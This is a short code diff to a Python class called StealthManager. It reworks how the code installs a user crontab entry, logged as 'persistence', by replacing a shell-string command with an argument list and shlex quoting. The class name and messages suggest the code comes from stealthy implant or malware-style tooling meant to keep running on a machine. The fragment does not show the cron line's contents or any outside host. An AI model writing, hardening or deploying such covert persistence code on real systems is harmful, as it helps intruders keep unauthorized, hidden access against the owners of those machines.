@@ -421,8 +421,11 @@ class StealthManager:
                 # Try user crontab
                 try:
                     import subprocess
+                    import shlex
                     subprocess.run(["crontab", "-l"], capture_output=True)
-                    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
+                    subprocess.run(
+                        ["sh", "-c", f'(crontab -l 2>/dev/null; echo {shlex.quote(cron_line)}) | crontab -']
+                    )
                     logger.info("Added user crontab persistence")
                 except Exception as e:
                     logger.warning(f"Could not install cron: {e}")
